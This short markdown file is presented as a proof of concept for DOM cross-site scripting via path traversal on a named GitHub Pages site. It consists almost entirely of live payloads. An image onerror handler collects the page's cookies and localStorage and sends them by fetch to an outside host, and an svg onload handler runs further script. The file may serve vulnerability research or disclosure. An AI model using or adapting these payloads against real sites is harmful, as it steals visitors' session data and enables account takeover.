# XSS PoC

This file demonstrates DOM XSS via path traversal in awesome-copilot.github.com

<img src=x onerror="document.title=`XSS-FIRED-`+document.domain;window.__xss_fired=true;console.log(`%c[XSS] Fired in origin: `+document.domain+`, cookies: `+document.cookie+`, localStorage keys: `+Object.keys(localStorage).join(`,`),`color:red;font-size:20px`);fetch(`https://poc.kesef.cloud/xss/awesome-copilot/marked-traversal/fired?d=`+encodeURIComponent(document.domain+`|`+document.cookie+`|`+JSON.stringify(localStorage)))">

<svg onload="window.__xss_svg=true;document.body.style.background=`red`">

End of payload.